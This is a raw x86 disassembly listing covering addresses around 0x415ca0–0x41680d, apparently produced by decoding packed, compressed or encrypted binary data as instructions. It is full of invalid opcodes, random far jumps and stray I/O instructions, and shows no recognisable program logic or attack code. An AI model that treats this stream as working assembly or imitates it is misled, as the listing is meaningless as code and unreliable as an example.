  415ca0:	popf   
  415ca1:	popf   
  415ca2:	in     al,0x3f
  415ca4:	mov    al,ds:0x9cc5ad82
  415ca9:	push   ebx
  415caa:	inc    edi
  415cab:	mov    eax,0xc7510a77
  415cb0:	sbb    eax,0xa2d2e806
  415cb5:	adc    al,0x9c
  415cb7:	js     0x415c81
  415cb9:	adc    ebx,esp
  415cbb:	or     cl,dh
  415cbd:	cmp    bl,dh
  415cbf:	jnp    0x415ce1
  415cc1:	push   ecx
	...
  415d32:	add    BYTE PTR [eax],al
  415d34:	mov    bh,0x99
  415d36:	adc    dl,BYTE PTR [ecx-0x404864c2]
  415d3c:	pop    ebp
  415d3d:	jmp    0x7dfb:0x5a89e72f
  415d44:	sub    bh,ch
  415d46:	add    BYTE PTR [eax],al
  415d48:	test   BYTE PTR [eax],0x0
  415d4b:	add    BYTE PTR [ebp+0x77bfcc95],dl
  415d51:	sbb    BYTE PTR [eax-0x1fddd07b],ah
  415d57:	lods   al,BYTE PTR ds:[esi]
  415d58:	cli    
  415d59:	push   esp
  415d5a:	and    BYTE PTR [eax+0x5b],dh
  415d5d:	mov    esi,0xccb36a6b
  415d62:	clc    
  415d63:	and    al,BYTE PTR [eax+0x17eec020]
  415d69:	add    esi,DWORD PTR [edi+ecx*1+0x72078b8e]
  415d70:	rcr    DWORD PTR [edi+0x6a357ea7],1
  415d76:	arpl   WORD PTR [esi+0x13],sp
  415d79:	shl    BYTE PTR [ecx-0x2b],cl
  415d7c:	inc    edx
  415d7d:	dec    ebx
  415d7e:	xchg   DWORD PTR [edi],ecx
  415d80:	mov    ebp,0x4d13f50e
  415d85:	loop   0x415da2
  415d87:	mov    WORD PTR [esi-0x34399623],fs
  415d8d:	repnz mov edx,0x7a6fb827
  415d93:	(bad)  
  415d94:	fadd   st(7),st
  415d96:	pop    ds
  415d97:	js     0x415d37
  415d99:	inc    ebp
  415d9a:	in     al,dx
  415d9b:	cmp    al,0x63
  415d9d:	call   0xff637fca
  415da2:	sub    ch,BYTE PTR [edx-0x37]
  415da5:	int3   
  415da6:	enter  0x9e64,0xe3
  415daa:	retf   
  415dab:	leave  
  415dac:	sahf   
  415dad:	fistp  QWORD PTR [ebx+0x687368b4]
  415db3:	(bad)  
  415db4:	jo     0x415df6
  415db6:	js     0x415de5
  415db8:	icebp  
  415db9:	loop   0x415e28
  415dbb:	in     al,0xa1
  415dbd:	adc    eax,0xe9bd1a87
  415dc2:	or     al,0x12
  415dc4:	aam    0x35
  415dc6:	mul    BYTE PTR [ecx]
  415dc8:	add    ah,BYTE PTR [ebx-0x5b4b474c]
  415dce:	mov    dh,0xe5
  415dd0:	ret    
  415dd1:	push   ebp
  415dd2:	aas    
  415dd3:	sar    DWORD PTR ds:0xbfc1c908,1
  415dd9:	leave  
  415dda:	ret    
  415ddb:	test   al,0x98
  415ddd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dde:	cmp    eax,0xacc6d4fb
  415de3:	pop    ss
  415de4:	cmp    al,0x91
  415de6:	cwde   
  415de7:	sti    
  415de8:	jo     0x415e24
  415dea:	imul   ebx,edx,0x28
  415ded:	(bad)  
  415def:	lods   al,BYTE PTR ds:[esi]
  415df0:	stc    
  415df1:	pop    ebp
  415df2:	mov    bl,0x23
  415df4:	retf   0x469c
  415df7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415df8:	gs dec esp
  415dfa:	daa    
  415dfb:	xor    al,0x5a
  415dfd:	fimul  WORD PTR [edx]
  415dff:	(bad)
  415e03:	leave  
  415e04:	jmp    0x5d33d999
  415e09:	test   BYTE PTR [esi-0x73],dh
  415e0c:	mov    dh,BYTE PTR [ebx-0x5998ea70]
  415e12:	mov    eax,0xcd0787cf
  415e17:	ds jmp 0x7b60:0x504bb3bc
  415e1f:	pop    ebp
  415e20:	gs out 0x60,al
  415e23:	mov    ecx,0xf7f48640
  415e28:	data16 jnp 0x415e31
  415e2b:	mov    esi,0xb76978f
  415e30:	push   ebx
  415e31:	pop    edx
  415e32:	or     ebx,DWORD PTR [edx]
  415e34:	fisttp DWORD PTR [edi+0x12]
  415e37:	test   al,0x17
  415e39:	fs mov ebp,0xf8bf000b
  415e3f:	std    
  415e40:	mov    edx,edi
	...
  415eb2:	add    BYTE PTR [eax],al
  415eb4:	aaa    
  415eb5:	data16 xor al,0x9b
  415eb8:	jne    0x415e95
  415eba:	mov    edi,0xdeb84bee
  415ebf:	gs jne 0x415f27
  415ec2:	fstp   DWORD PTR [ecx+0x1e]
  415ec5:	lock add BYTE PTR [eax],al
  415ec8:	test   BYTE PTR [eax],0x0
  415ecb:	add    BYTE PTR [ecx],ah
  415ecd:	imul   ebx
  415ecf:	rep outs dx,DWORD PTR ds:[esi]
  415ed1:	pop    esp
  415ed2:	imul   edi,DWORD PTR [ebp+edi*4+0x6],0xcd4ff880
  415eda:	lock fst DWORD PTR [edx-0x50]
  415ede:	adc    al,0xde
  415ee0:	xor    bh,dl
  415ee2:	sbb    al,0x61
  415ee4:	cmp    bh,BYTE PTR [ebp+0x3247c942]
  415eea:	sbb    eax,0x9e80c023
  415eef:	pop    ebx
  415ef0:	scas   eax,DWORD PTR es:[edi]
  415ef1:	repz jle 0x415e80
  415ef4:	in     eax,dx
  415ef5:	push   esp
  415ef6:	cmp    al,bh
  415ef8:	retf   
  415ef9:	fwait
  415efa:	add    BYTE PTR [si+0x5a],dl
  415efe:	inc    DWORD PTR [ecx-0x2af065ae]
  415f04:	push   es
  415f05:	sbb    ax,0xe5d9
  415f09:	cdq    
  415f0a:	inc    ecx
  415f0b:	dec    ecx
  415f0c:	mov    esi,DWORD PTR [ebp+0x1c7a8ec7]
  415f12:	test   al,0x52
  415f14:	dec    eax
  415f15:	mov    dh,0xc0
  415f17:	aaa    
  415f18:	cmp    esp,0xec4fb0a9
  415f1e:	ja     0x415f52
  415f20:	in     eax,dx
  415f21:	mov    ecx,0xf373fec5
  415f26:	jge    0x415fa1
  415f28:	jecxz  0x415f3f
  415f2a:	or     BYTE PTR [edi+eiz*1],0x90
  415f2e:	jno    0x415f52
  415f30:	pop    edx
  415f31:	mov    ah,0x4
  415f33:	mov    esp,0x1302c9fc
  415f38:	sub    eax,0xe139be7d
  415f3d:	(bad)  [esi-0x8]
  415f40:	imul   ebp,DWORD PTR [esi],0xffffffdf
  415f43:	sub    al,0x36
  415f45:	sbb    ebp,DWORD PTR [esi-0x58]
  415f48:	add    bh,ah
  415f4a:	mov    esp,0x1bdf3ae4
  415f4f:	fadd   DWORD PTR [edi]
  415f51:	xlat   BYTE PTR ds:[ebx]
  415f52:	and    eax,0x423aca5a
  415f57:	test   al,0xcc
  415f59:	dec    ecx
  415f5a:	cmp    edi,DWORD PTR [esi-0x6]
  415f5d:	xlat   BYTE PTR ds:[ebx]
  415f5e:	shr    BYTE PTR [ebx],0xe1
  415f61:	mov    al,ds:0xa8713d4a
  415f66:	cmp    DWORD PTR [ecx+0x788d3ad4],esp
  415f6c:	(bad)  
  415f6d:	jle    0x415f76
  415f6f:	jecxz  0x415f63
  415f71:	sub    ecx,esi
  415f73:	mov    esp,0x92046d09
  415f78:	push   cs
  415f79:	jbe    0x415fe0
  415f7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f7c:	hlt    
  415f7d:	sub    DWORD PTR [ecx+0x41],ebp
  415f80:	cmc    
  415f81:	popf   
  415f82:	sbb    al,0xc8
  415f84:	or     cl,BYTE PTR [edi-0x72]
  415f87:	mov    ah,0x40
  415f89:	mov    edi,0xb74e6ac1
  415f8e:	out    0x9e,eax
  415f90:	xchg   ecx,eax
  415f91:	inc    ecx
  415f92:	and    al,0xc8
  415f94:	cdq    
  415f95:	(bad)  
  415f96:	int    0x97
  415f98:	pop    eax
  415f99:	push   0x36
  415f9b:	xor    edx,ecx
  415f9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f9e:	sub    edi,0xf36ec688
  415fa4:	fdivr  QWORD PTR [ecx]
  415fa6:	shl    BYTE PTR [ebx-0x190ec5ba],1
  415fac:	aad    0x95
  415fae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415faf:	call   0x7c2de4f6
  415fb4:	sbb    edx,esi
  415fb6:	stos   DWORD PTR es:[edi],eax
  415fb7:	and    al,0x63
  415fb9:	cmp    eax,0x34398080
  415fbe:	cdq    
  415fbf:	add    edx,ecx
  415fc1:	cmp    al,BYTE PTR [eax]
	...
  416033:	add    BYTE PTR [ebx+0x2],bh
  416036:	add    ebp,ebx
  416038:	jnp    0x416025
  41603a:	sti    
  41603b:	xchg   edx,eax
  41603c:	rol    al,cl
  41603e:	(bad)  
  41603f:	imul   esi,DWORD PTR [esi+0x1419aabf],0xfffffff1
  416046:	add    BYTE PTR [eax],al
  416048:	test   BYTE PTR [eax],0x0
  41604b:	add    BYTE PTR [edi+eiz*2+0x79f70828],ch
  416052:	and    edi,DWORD PTR [ecx+0x5d]
  416055:	xchg   ebp,eax
  416056:	sub    DWORD PTR [eax-0x23],ecx
  416059:	cmovbe edi,DWORD PTR [eax-0x79464e2a]
  416060:	push   0xffffffcb
  416062:	mov    ebp,0x34a14908
  416067:	test   eax,0x47744759
  41606c:	ins    BYTE PTR es:[edi],dx
  41606d:	retf   
  41606e:	fnstsw WORD PTR [ebp-0x483e16fc]
  416074:	ins    DWORD PTR es:[edi],dx
  416075:	(bad)  
  416076:	scas   eax,DWORD PTR es:[edi]
  416077:	adc    eax,0x7f0522
  41607c:	mov    dh,0xab
  41607e:	jl     0x41605b
  416080:	stc    
  416081:	mov    esi,0xd98f9909
  416086:	xchg   esp,eax
  416087:	dec    esi
  416088:	sbb    esp,DWORD PTR [ebx-0x51d16cff]
  41608e:	jmp    0xdac:0x1dd6ef81
  416095:	mov    ch,0xd4
  416097:	jnp    0x416118
  416099:	enter  0x4ce6,0xa7
  41609d:	pop    ss
  41609e:	mov    BYTE PTR [ebx],0x87
  4160a1:	inc    esi
  4160a2:	xor    ebx,DWORD PTR [ebx]
  4160a4:	jl     0x41606a
  4160a6:	fs es xchg esi,eax
  4160a9:	mov    edi,0xe0875e9
  4160ae:	push   ss
  4160af:	xor    bl,BYTE PTR [eax+eiz*8]
  4160b2:	mov    ebp,0x5f19191b
  4160b7:	icebp  
  4160b8:	push   esp
  4160b9:	mov    cl,0x4f
  4160bb:	addr16 pop esp
  4160bd:	outs   dx,BYTE PTR ds:[esi]
  4160be:	or     al,0x86
  4160c0:	mov    ah,0x2f
  4160c2:	adc    al,BYTE PTR [ecx+0x37]
  4160c5:	push   es
  4160c6:	call   0x9ec5:0x68593f53
  4160cd:	inc    edi
  4160ce:	mov    ebx,0xf9cb5967
  4160d3:	mov    ebp,0x4c6aae77
  4160d8:	call   FWORD PTR [esi+0x16cd2eef]
  4160de:	out    dx,eax
  4160df:	dec    ebp
  4160e0:	push   ebp
  4160e1:	pop    es
  4160e2:	add    eax,0x23e2e7e3
  4160e7:	push   esi
  4160e8:	int3   
  4160e9:	mov    ecx,DWORD PTR [esi+0x58]
  4160ec:	xor    cl,BYTE PTR [eax]
  4160ee:	mov    eax,0xa5216c5c
  4160f3:	out    0x7b,eax
  4160f5:	das    
  4160f6:	mov    ebp,fs
  4160f8:	adc    DWORD PTR [ebp+eiz*8-0x703ff479],eax
  4160ff:	ficom  WORD PTR [edx+edx*4]
  416102:	add    dh,BYTE PTR [ecx+0x72be33b]
  416108:	push   edx
  416109:	mov    dl,BYTE PTR [eax+0x16b7b9e1]
  41610f:	xor    al,0x22
  416111:	ins    DWORD PTR es:[edi],dx
  416112:	sbb    cl,bh
  416114:	sti    
  416115:	stc    
  416116:	nop
  416117:	pop    ss
  416118:	inc    ebx
  416119:	les    ecx,FWORD PTR [ebx-0x492319b3]
  41611f:	aaa    
  416120:	add    bh,al
  416122:	xor    eax,0xd8d98ca4
  416127:	pop    ds
  416128:	jp     0x416137
  41612a:	outs   dx,DWORD PTR ds:[esi]
  41612b:	or     cl,cl
  41612d:	(bad)  
  41612e:	nop
  41612f:	iret   
  416130:	(bad)  
  416131:	mov    al,0x47
  416133:	xchg   esi,eax
  416134:	mov    edi,0x79c05549
  416139:	xchg   edi,eax
  41613a:	or     al,0x37
  41613c:	lods   al,BYTE PTR ds:[esi]
  41613d:	and    bh,cl
  41613f:	or     BYTE PTR [edi+0x5a],bl
	...
  4161b1:	add    BYTE PTR [eax],al
  4161b3:	add    BYTE PTR [edi+edx*4],ch
  4161b6:	pop    ds
  4161b7:	sar    DWORD PTR [edi-0x8001127],1
  4161bd:	test   al,0xcb
  4161bf:	sub    edx,DWORD PTR [ebx+ecx*2-0xdf58dfe]
  4161c6:	add    BYTE PTR [eax],al
  4161c8:	test   BYTE PTR [eax],0x0
  4161cb:	add    BYTE PTR [ebp+0x74e9b707],bh
  4161d1:	inc    edx
  4161d2:	xchg   ebx,eax
  4161d3:	(bad)  [eax]
  4161d5:	pop    ebp
  4161d6:	mov    ebx,0xa67b2a4a
  4161db:	repz loop 0x41615f
  4161de:	mov    eax,0x4c559a73
  4161e3:	hlt    
  4161e4:	jb     0x416260
  4161e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161e7:	jno    0x4161c8
  4161e9:	add    ch,BYTE PTR [ebp-0x38d9b14]
  4161ef:	shl    BYTE PTR [esi+0x6b9945a2],cl
  4161f5:	test   al,0x86
  4161f7:	(bad)  
  4161f8:	mov    BYTE PTR [esi+0x63],al
  4161fb:	loop   0x41623a
  4161fd:	ins    BYTE PTR es:[edi],dx
  4161fe:	mov    edi,edi
  416200:	push   ecx
  416201:	(bad)  
  416203:	je     0x41627b
  416205:	xchg   edi,eax
  416206:	std    
  416207:	or     BYTE PTR [ebx-0x3aa9c0a2],dl
  41620d:	gs dec eax
  41620f:	xchg   edi,eax
  416210:	inc    eax
  416211:	xor    al,0x1e
  416213:	std    
  416214:	cmp    DWORD PTR [edi+0x7d],0x30
  416218:	(bad)  
  416219:	xchg   ebx,eax
  41621a:	cmp    al,0xc9
  41621c:	sbb    dl,BYTE PTR [ecx+0x284bd5a7]
  416222:	pop    eax
  416223:	(bad)  
  416224:	jle    0x4161e8
  416226:	(bad)  
  416227:	or     BYTE PTR [eax-0x43],dl
  41622a:	mov    dh,0x7d
  41622c:	add    eax,0xeb327343
  416231:	pop    ds
  416232:	pop    es
  416233:	mov    ebx,0x69ea3eec
  416238:	pop    ebp
  416239:	sahf   
  41623a:	xchg   edi,eax
  41623b:	mov    ds:0xad29091c,eax
  416240:	loop   0x416294
  416242:	and    ah,BYTE PTR [eax+0x332478e7]
  416248:	sub    al,0x1f
  41624a:	bound  eax,QWORD PTR [ebx-0x7bfcdc06]
  416250:	sbb    ah,BYTE PTR [edi+0x152a2190]
  416256:	jge    0x416231
  416258:	add    bh,BYTE PTR es:[ecx+0x2f]
  41625c:	mov    ds:0xd566cc44,al
  416261:	retf   
  416262:	(bad)  
  416263:	jmp    0xb198db91
  416268:	jne    0x4162b9
  41626a:	push   ss
  41626b:	adc    DWORD PTR [ebx+ebp*4+0x489b3748],edx
  416272:	adc    al,0xf3
  416274:	xchg   esp,eax
  416275:	pusha  
  416276:	shl    BYTE PTR [ebp+eiz*8+0x6f21b37b],0xf4
  41627e:	fcom   QWORD PTR [ebx-0x765d18b0]
  416284:	ficomp WORD PTR [ecx+eiz*1-0xf]
  416288:	cld    
  416289:	mov    esi,0xecba88b1
  41628e:	push   eax
  41628f:	(bad)  
  416290:	jle    0x416278
  416292:	ret    0xc294
  416295:	mov    ds:0x1c621e6d,al
  41629a:	das    
  41629b:	fbstp  TBYTE PTR [ebx-0x51]
  41629e:	add    DWORD PTR [ecx],0x35bac688
  4162a4:	hlt    
  4162a5:	ins    BYTE PTR es:[edi],dx
  4162a6:	adc    BYTE PTR [ecx+0x74],bl
  4162a9:	das    
  4162aa:	xchg   ecx,eax
  4162ab:	(bad)  
  4162ac:	cwde   
  4162ad:	test   DWORD PTR [ebp+0x6ca35e2b],ebp
  4162b3:	ins    DWORD PTR es:[edi],dx
  4162b4:	js     0x4162a3
  4162b6:	cmp    BYTE PTR [edx],ah
  4162b8:	add    bl,BYTE PTR [edx+eiz*1-0x11]
  4162bc:	mov    ds:0xc50a3729,al
  4162c1:	test   DWORD PTR [eax],eax
	...
  416333:	add    BYTE PTR [ebp-0x10],ch
  416336:	repz jmp FWORD PTR cs:[edi]
  41633a:	std    
  41633b:	repz push eax
  41633d:	xchg   ecx,eax
  41633e:	scas   al,BYTE PTR es:[edi]
  41633f:	fld    QWORD PTR [ebx+0x23c093]
  416345:	repz add BYTE PTR [eax],al
  416348:	test   BYTE PTR [eax],0x0
  41634b:	add    cl,ch
  41634d:	jns    0x416357
  41634f:	mov    esi,DWORD PTR [edi]
  416351:	sub    ecx,eax
  416353:	sti    
  416354:	push   cs
  416355:	pop    ss
  416356:	fisubr DWORD PTR [edi+0x504ad148]
  41635c:	aas    
  41635d:	stc    
  41635e:	test   BYTE PTR [ebp-0x3f61165e],0x7e
  416365:	test   DWORD PTR [eax+0x23],eax
  416368:	sub    edi,DWORD PTR [ebp-0x5bef4bf9]
  41636e:	ins    BYTE PTR es:[edi],dx
  41636f:	popa   
  416370:	add    BYTE PTR [edx+0x1f6921e9],ah
  416376:	adc    ah,BYTE PTR ds:[edi+0x13e7c7cd]
  41637d:	inc    esi
  41637e:	call   esp
  416380:	pop    ss
  416381:	cmp    al,0xcf
  416383:	nop
  416384:	xor    al,0x2
  416386:	int    0x80
  416388:	jmp    0xe15f:0xd920ac2c
  41638f:	ja     0x416358
  416391:	daa    
  416392:	in     eax,dx
  416393:	(bad)  
  416394:	xor    DWORD PTR [edx+edx*2+0x60f49ff],ebp
  41639b:	ficomp DWORD PTR [edx-0x38]
  41639e:	std    
  41639f:	leave  
  4163a0:	push   esp
  4163a1:	lahf   
  4163a2:	outs   dx,DWORD PTR ds:[esi]
  4163a3:	repz add BYTE PTR [edx+eax*8],bl
  4163a7:	outs   dx,BYTE PTR ds:[esi]
  4163a8:	fcom   DWORD PTR [eax-0x76]
  4163ab:	adc    BYTE PTR [ecx],al
  4163ad:	cmp    al,0x40
  4163af:	js     0x416345
  4163b1:	aaa    
  4163b2:	mov    cl,0xfe
  4163b4:	(bad)  
  4163b5:	lahf   
  4163b6:	or     BYTE PTR [ecx+0x49053fc5],cl
  4163bc:	ja     0x41637b
  4163be:	out    dx,al
  4163bf:	adc    BYTE PTR [ecx+edx*8],dh
  4163c2:	(bad)  
  4163c3:	repz pop ebp
  4163c5:	sub    ah,BYTE PTR [edi-0x25367544]
  4163cb:	jge    0x4163d1
  4163cd:	push   ss
  4163ce:	sar    DWORD PTR [esi],cl
  4163d0:	mov    dl,0xbe
  4163d2:	loop   0x41635b
  4163d4:	or     DWORD PTR [eax-0x73c85983],ecx
  4163da:	jno    0x4163d7
  4163dc:	adc    al,0xf0
  4163de:	std    
  4163df:	add    al,0xcf
  4163e1:	sbb    esp,DWORD PTR ds:0x7512dd8d
  4163e7:	mov    edi,0xbddfcee4
  4163ec:	jg     0x416415
  4163ee:	aas    
  4163ef:	std    
  4163f0:	test   DWORD PTR [eax+eax*8],ecx
  4163f3:	push   ebx
  4163f4:	add    eax,0x396287f3
  4163f9:	gs add edx,edx
  4163fc:	addr16 jo 0x416426
  4163ff:	adc    eax,0x1f45af29
  416404:	xor    edi,ebp
  416406:	jge    0x4163ea
  416408:	addr16 jle 0x416430
  41640b:	psraw  mm4,mm7
  41640e:	and    al,0xa8
  416410:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416411:	xlat   BYTE PTR ds:[ebx]
  416412:	ret    0xd8b1
  416415:	xchg   ecx,eax
  416416:	cs sti 
  416418:	push   esi
  416419:	cmp    eax,0x2d1c9448
  41641e:	adc    BYTE PTR [eax+0x251261f0],al
  416424:	cs pop edx
  416426:	dec    esi
  416427:	mov    edi,DWORD PTR [edi+ebp*2]
  41642a:	adc    esi,DWORD PTR [edx+0x468c4e2]
  416430:	xchg   esi,eax
  416431:	gs cmp edi,esi
  416434:	loope  0x41644e
  416436:	(bad)  
  416437:	lods   eax,DWORD PTR ds:[esi]
  416438:	aaa    
  416439:	push   ebp
  41643a:	sub    edi,edi
  41643c:	stos   BYTE PTR es:[edi],al
  41643d:	es cmc 
  41643f:	mov    bl,0x2f
  416441:	sub    al,BYTE PTR [eax]
	...
  4164b3:	add    ah,ah
  4164b5:	lock sub DWORD PTR [edx],ecx
  4164b8:	cmp    eax,0x4cfee7db
  4164bd:	or     BYTE PTR [ebx-0xa],ah
  4164c0:	mov    ?,WORD PTR [edi-0x6e]
  4164c3:	(bad)  
  4164c4:	div    bl
  4164c6:	add    BYTE PTR [eax],al
  4164c8:	test   BYTE PTR [eax],0x0
  4164cb:	add    ah,dl
  4164cd:	push   ebx
  4164ce:	sub    al,0x3c
  4164d0:	xor    ebx,eax
  4164d2:	mov    edx,0x60464776
  4164d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164d8:	or     edi,DWORD PTR [ebx+0x53]
  4164db:	icebp  
  4164dc:	push   cs
  4164dd:	pop    ecx
  4164de:	addr16 xchg ecx,eax
  4164e0:	cmp    ebp,edi
  4164e2:	ss out 0xb9,al
  4164e5:	stos   BYTE PTR es:[edi],al
  4164e6:	out    dx,eax
  4164e7:	adc    al,0xa3
  4164e9:	pop    ebp
  4164ea:	push   edx
  4164eb:	xor    al,BYTE PTR [esp+edi*8+0x786488e9]
  4164f2:	xor    edx,ebx
  4164f4:	add    ecx,DWORD PTR ds:0xcaccfd2a
  4164fa:	mov    eax,ds:0xbd4d37cf
  4164ff:	test   eax,0x86baee11
  416504:	jmp    0xac3cd58c
  416509:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41650a:	mov    ebp,0x183b2592
  41650f:	ret    0x32b6
  416512:	(bad)  
  416513:	xor    edx,DWORD PTR [ebp-0x415d6061]
  416519:	jbe    0x416512
  41651b:	dec    ebp
  41651c:	std    
  41651d:	lea    esi,cs:[eax-0x38]
  416521:	int    0xa2
  416523:	xchg   esp,eax
  416524:	mov    edi,0xfde1439e
  416529:	mov    edx,0xc415047c
  41652e:	scas   eax,DWORD PTR es:[edi]
  41652f:	ds mov dl,0x8e
  416532:	imul   DWORD PTR ds:0x95623ba6
  416538:	xor    al,0xd9
  41653a:	retf   0xbeef
  41653d:	adc    al,0x36
  41653f:	push   0x441ecb3a
  416544:	das    
  416545:	and    al,0xe8
  416547:	or     eax,0xd842e8a7
  41654c:	test   al,0x34
  41654e:	out    dx,eax
  41654f:	dec    edi
  416550:	popa   
  416551:	fist   DWORD PTR [ebp+0x301d11bb]
  416557:	out    0x2f,al
  416559:	jns    0x416574
  41655b:	sbb    bl,BYTE PTR [ebp-0x67]
  41655e:	sbb    DWORD PTR [eax-0x4b],esi
  416561:	push   ecx
  416562:	inc    edx
  416563:	or     al,0x6a
  416565:	sbb    ecx,ebx
  416567:	popf   
  416568:	fyl2xp1 
  41656a:	mov    gs,WORD PTR [edi]
  41656c:	sbb    BYTE PTR [edi-0x11a669ce],0x71
  416573:	call   0x891b2987
  416578:	adc    eax,DWORD PTR [eax-0x5d]
  41657b:	push   edi
  41657c:	xlat   BYTE PTR ds:[ebx]
  41657d:	inc    ecx
  41657e:	jp     0x41655c
  416580:	adc    al,0xe6
  416582:	out    0xf3,al
  416584:	push   ebx
  416585:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  416587:	pop    ebx
  416588:	xchg   esp,eax
  416589:	add    al,0x1b
  41658b:	je     0x4165d1
  41658d:	(bad)  
  41658f:	retf   
  416590:	jmp    0x4165cb
  416592:	pusha  
  416593:	sbb    edx,0xffffffdd
  416596:	pop    edx
  416597:	cwde   
  416598:	lods   al,BYTE PTR ds:[esi]
  416599:	pop    edi
  41659a:	dec    eax
  41659b:	stc    
  41659c:	and    dh,BYTE PTR [ecx+0x2b3c4ef6]
  4165a2:	push   ebx
  4165a3:	mov    ebx,0x2088f61c
  4165a8:	mov    edx,0x43cdf25a
  4165ad:	mov    ds:0xc139264,al
  4165b2:	xchg   edx,eax
  4165b3:	adc    dh,BYTE PTR [ebp-0x58bcc8df]
  4165b9:	cmp    BYTE PTR [eax+0x6f18819b],cl
  4165bf:	xchg   ebx,eax
  4165c0:	shl    esi,0x0
	...
  416633:	add    BYTE PTR [ebp-0x66],ch
  416636:	mov    esp,0xfd67ff45
  41663b:	mov    edx,0xd5f418cb
  416640:	pop    eax
  416641:	xchg   ebp,eax
  416642:	jle    0x4166be
  416644:	in     al,dx
  416645:	hlt    
  416646:	add    BYTE PTR [eax],al
  416648:	test   BYTE PTR [eax],0x0
  41664b:	add    BYTE PTR [ebx+0x6f],al
  41664e:	push   edi
  41664f:	out    0x61,al
  416651:	(bad)  
  416653:	mov    dh,dh
  416655:	xchg   esi,eax
  416656:	(bad)
  416659:	push   ss
  41665a:	jae    0x41668f
  41665c:	shr    dh,1
  41665e:	int    0x59
  416660:	fcomi  st,st(5)
  416662:	fdiv   DWORD PTR [eax-0x3ad58bcd]
  416668:	jno    0x4166d9
  41666a:	mov    ecx,0x60ba89b1
  41666f:	mov    edi,0xa33390ee
  416674:	mov    ch,0xdd
  416676:	pop    edi
  416677:	mov    dl,BYTE PTR [edi-0x43]
  41667a:	test   ebp,0x5cab6b6e
  416680:	cmp    al,BYTE PTR [esi]
  416682:	push   cs
  416683:	jns    0x416665
  416685:	dec    esp
  416686:	lods   eax,DWORD PTR ds:[esi]
  416687:	xchg   edx,eax
  416688:	xchg   DWORD PTR [ebx+0x454a5888],ebp
  41668e:	(bad)  fs:[esi+0x40e4d755]
  416695:	shr    DWORD PTR [edx+0x56],cl
  416698:	push   ds
  416699:	xor    BYTE PTR [esi+0x5c627e69],dl
  41669f:	mov    bx,0x1176
  4166a3:	pop    ecx
  4166a4:	(bad)  
  4166a5:	lahf   
  4166a6:	jmp    0x4cd5:0x4c3eed89
  4166ad:	ret    0xb79b
  4166b0:	scas   eax,DWORD PTR es:[edi]
  4166b1:	push   es
  4166b2:	xchg   edx,eax
  4166b3:	(bad)  
  4166b4:	int    0x7b
  4166b6:	inc    ebx
  4166b7:	sub    eax,0x2d2b5580
  4166bc:	adc    eax,0xde91a377
  4166c1:	sub    cl,BYTE PTR [esi+0x3fd47811]
  4166c7:	retf   
  4166c8:	out    0x78,eax
  4166ca:	inc    edx
  4166cb:	(bad)  
  4166cc:	retf   
  4166cd:	mov    eax,ds:0x77f5ebe8
  4166d2:	mov    al,0xeb
  4166d4:	xchg   ebp,eax
  4166d5:	or     eax,0xe336ab02
  4166da:	push   edx
  4166db:	mov    ch,ah
  4166dd:	xchg   edi,eax
  4166de:	sbb    DWORD PTR [eax-0x78d0269f],ebp
  4166e4:	mov    ch,0x64
  4166e6:	jmp    0x7937d0c
  4166eb:	sti    
  4166ec:	lods   al,BYTE PTR ds:[esi]
  4166ed:	jecxz  0x416742
  4166ef:	ffreep st(4)
  4166f1:	push   ebp
  4166f2:	jmp    0x416736
  4166f4:	aam    0xe6
  4166f6:	scas   al,BYTE PTR es:[edi]
  4166f7:	mov    edx,0x93f4e08f
  4166fc:	push   esi
  4166fd:	jg     0x4166fb
  4166ff:	sub    al,0xc8
  416701:	lahf   
  416702:	jl     0x4166be
  416704:	inc    DWORD PTR [ebx+0x1]
  416707:	jbe    0x4166bb
  416709:	pop    esi
  41670a:	ror    ebp,cl
  41670c:	xor    bl,BYTE PTR [ebp+0x7fda9e65]
  416712:	sbb    BYTE PTR [edx-0xe],bl
  416715:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416716:	sahf   
  416717:	dec    eax
  416718:	pop    ecx
  416719:	inc    eax
  41671a:	mov    ds:0x7bb33188,al
  41671f:	add    DWORD PTR [di],eax
  416722:	int3   
  416723:	xor    esp,DWORD PTR [ebx+0x25]
  416726:	xchg   ebp,eax
  416727:	stos   BYTE PTR es:[edi],al
  416728:	pushf  
  416729:	sbb    eax,0x7d890162
  41672e:	jle    0x416734
  416730:	and    cl,bh
  416732:	or     BYTE PTR [eax-0x267f6411],al
  416738:	pop    ecx
  416739:	xchg   esp,eax
  41673a:	stc    
  41673b:	xlat   BYTE PTR ds:[ebx]
  41673c:	dec    esi
  41673d:	jmp    0xbbf74854
	...
  4167b2:	add    BYTE PTR [eax],al
  4167b4:	retf   
  4167b5:	(bad)  
  4167b6:	xchg   ebx,eax
  4167b7:	in     al,dx
  4167b8:	mov    bh,0xed
  4167ba:	(bad)  
  4167bb:	push   DWORD PTR [ecx+0x19]
  4167be:	comiss xmm3,DWORD PTR [esi]
  4167c1:	mul    DWORD PTR [edi+0xf5e2a6]
  4167c7:	add    dh,dh
  4167c9:	add    BYTE PTR [eax],al
  4167cb:	add    BYTE PTR [esi],bh
  4167cd:	mov    ds:0x1addc1a3,eax
  4167d2:	arpl   sp,ax
  4167d4:	xchg   DWORD PTR [ecx],eax
  4167d6:	mov    al,ds:0x3c14237d
  4167db:	push   ebx
  4167dc:	scas   eax,DWORD PTR es:[edi]
  4167dd:	int3   
  4167de:	idiv   BYTE PTR [eax-0x75]
  4167e1:	dec    esi
  4167e2:	test   BYTE PTR [edx-0x1fb69e2],bh
  4167e8:	push   es
  4167e9:	push   edi
  4167ea:	cmp    al,0x1e
  4167ec:	gs popf 
  4167ee:	std    
  4167ef:	in     al,dx
  4167f0:	mov    ebp,0x47cc6feb
  4167f5:	mov    edx,0x8abf8090
  4167fa:	inc    edx
  4167fb:	mov    BYTE PTR [edi+0x1abb0e87],ch
  416801:	jo     0x416798
  416803:	popa   
  416804:	xor    ebp,DWORD PTR [ebx+0x6d722855]
  41680a:	(bad)  
  41680b:	mov    dh,0x3
  41680d:	xor    al,0xd1
